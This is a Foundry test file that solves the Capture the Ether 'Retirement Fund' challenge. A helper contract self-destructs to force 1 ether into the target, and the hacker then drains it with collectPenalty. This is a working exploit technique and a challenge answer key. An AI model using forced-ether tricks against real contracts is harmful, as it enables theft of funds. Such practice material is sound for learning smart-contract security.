// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import "src/math/3-retirement-fund.sol";

// add extra contracts you need to hack here
contract Bomb {
    function kaboom(address target) external payable {
        selfdestruct(payable(target));
    }
}

contract RetirementFundChallengeTest is Test {
    RetirementFundChallenge target;
    address hacker;

    function setUp() public {
        hacker = vm.addr(1);
        vm.label(hacker, "Hacker");
        vm.deal(hacker, 1 ether);

        target = new RetirementFundChallenge{value: 1 ether}(hacker);
    }

    function testChallenge() public {
        vm.startPrank(hacker);

        // your code

        // kaktheplanet
        Bomb b = new Bomb();
        b.kaboom{value: 1 ether}(address(target));
        target.collectPenalty();
        // end of your code
        vm.stopPrank();

        assertTrue(target.isComplete());
    }
}
